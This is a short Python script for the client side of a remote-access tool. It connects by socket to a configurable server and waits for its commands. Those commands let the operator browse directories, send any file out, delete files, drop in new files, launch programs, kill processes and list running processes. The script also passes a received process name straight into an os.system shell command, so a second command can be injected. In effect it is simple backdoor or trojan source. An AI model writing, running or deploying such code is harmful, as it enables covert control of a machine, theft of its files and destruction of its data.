import os 
import socket
import sys
import psutil
s=socket.socket()
port = 8080#you have to change 
host = "127.0.0.1"#maybe you have to change as public changes often
s.connect((host,port))
print("")
print("connected to host server!")
print("")

while 1:
    apps=""
    file_path=""
    data=""
    files=""
    fileanddir=""
    command = s.recv(1024)
    command = command.decode()
    print("Command recieved")
    print("")
    if command =="view_cwd":
             files = os.getcwd()
             files = str(files)
             s.send(files.encode())
             print ("Command has been executed successfully..")

    elif command =="custom_dir":
        try:
           user_input = s.recv (5000)
           user_input = user_input.decode ()
           files = os.listdir (user_input)
           files = str(files)
           s.send(files.encode())
           print("")
           print ("Command has been executed successfully..")
           print ("")
        except Exception as e:
            
            s.send(bytes("Couldn't find file with that name","utf-8"))
            
    
    elif command == "download_file":
        try:
          file_path = s.recv (6000)
          file_path = file_path.decode()
          file = open(file_path, "rb")
          data = file.read()
          s.send(data)
          print("**")
          print ("File has been sent successfully")
          print ("**")
        except Exception as e:
            s.send(bytes("Couldn't find file with that name","utf-8"))

    elif command == "delete_file":
        try:
         fileanddir = s.recv(6000)
         fileanddir = fileanddir.decode()
         os.remove (fileanddir)
         print ("")
         print ("Command has been executed successfully")
        except Exception as e:
            s.send(bytes("Couldn't find file with that name","utf-8"))

    elif command =="send_file":
        try:
         filename = s.recv(6000).decode()
         print(filename)
         if filename=="stopwrt":
             continue
         else:
             new_file =  open (filename,"wb")
             data = s.recv(6000) #Change when a file is big
             new_file.write (data)
             new_file.close()
        except Exception as e:
            s.send(bytes("Error while accepting file","utf-8"))

    elif command == "active_dir":
        files = os.listdir()
        files = str(files)
        s.send(files.encode())
        print("command has been executed successfully")

    elif command == "open":
        openexe = s.recv(6000)
        openexe = openexe.decode()
        openner = os.startfile(openexe)
        print("maybe executed")
        
    elif command == "close":
        closeexe = s.recv(6000)
        closeexe = closeexe.decode()
        cmdadder = "taskkill /im " + closeexe
        closer = os.system(cmdadder)
        print("maybe executed")

    elif command == "stop":
        s.close()
        sys.exit()

    elif command == "prcss":
        processes = psutil.process_iter()
        for process in processes:
            apps = process.name()
            s.send(apps.encode()) 
    else:
        print ("")
        print ("Command not recognised")
